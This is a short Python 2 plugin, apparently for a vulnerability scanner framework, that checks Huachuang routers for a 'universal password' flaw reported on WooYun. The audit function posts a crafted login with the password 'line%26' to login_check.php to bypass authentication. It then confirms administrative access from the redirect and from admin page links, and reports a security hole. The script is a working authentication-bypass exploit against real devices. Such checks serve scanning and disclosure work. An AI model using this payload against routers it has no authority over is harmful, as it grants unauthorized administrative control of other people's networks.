#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = LinE
#__refer__  = http://www.wooyun.org/bugs/wooyun-2010-0132543
'''
华创路由器万能密码
'''

import urlparse

def assign(service, arg):
    if service == 'huachang_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    post="userName=line&password=line%26"
    posturl =  "login_check.php"
    target = arg + posturl
    code, head, res, errcode, _ = curl.curl2(target,post=post)
    if code == 302 and "location: redirect.php" in head:
        code, head, res, errcode, _ = curl.curl2(arg)
        if code == 200  and "acc/network/network_interfaces.php" in res and 'acc/stats/system.php' in res:
            security_hole(target)


            return arg
if __name__== '__main__':
    from dummy import *
